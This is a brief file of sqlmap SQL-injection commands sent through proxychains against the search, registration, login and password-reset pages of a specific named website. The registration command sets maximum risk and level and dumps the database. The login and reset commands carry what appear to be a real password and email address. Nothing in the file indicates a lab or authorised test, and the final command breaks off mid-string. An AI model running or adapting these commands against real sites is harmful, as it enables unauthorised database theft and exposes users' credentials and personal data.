## SQL MAP ##

# The search page #
proxychains sqlmap -u "https://daedalus-systems.tech-sourcery.co.uk/index.php?route=product/search&search=knob"

# The register new user page #
proxychains sqlmap -u "https://daedalus-systems.tech-sourcery.co.uk/index.php?route-account/register" --data "-----------------------------312160266724025450251944745644\nContent-Disposition: form-data; name=\"password\"\n\npassword\n-----------------------------312160266724025450251944745644\nContent-Disposition: form-data; name=\"confirm\"\n\npassword\n-----------------------------312160266724025450251944745644--\n\n-----------------------------418959402723251904713225479109\nContent-Disposition: form-data; name=\"agree\"\n\n1\n-----------------------------418959402723251904713225479109--\n" --risk 3 --level 5 --dbms mysql --dump

# The user login page #
proxychains sqlmap -u "https://daedalus-systems.tech-sourcery.co.uk/index.php?route-account/login" -data "-----------------------------10225344102476555895450749570\nContent-Disposition: form-data; name=\"email\"\n\nAidan\n-----------------------------10225344102476555895450749570\nContent-Disposition: form-data; name=\"password\"\n\nJy4PHubZ9zLpJxm\n-----------------------------10225344102476555895450749570--"\n

# The forgot my password page#
 proxychains sqlmap -u "https://daedalus-systems.tech-sourcery.co.uk/index.php?route=account/forgotten" -data "-----------------------------231960497037379637281406524027\nContent-Disposition: form-data; name="email"\n\nredyelruc1@hotmail.com\n--------------------------
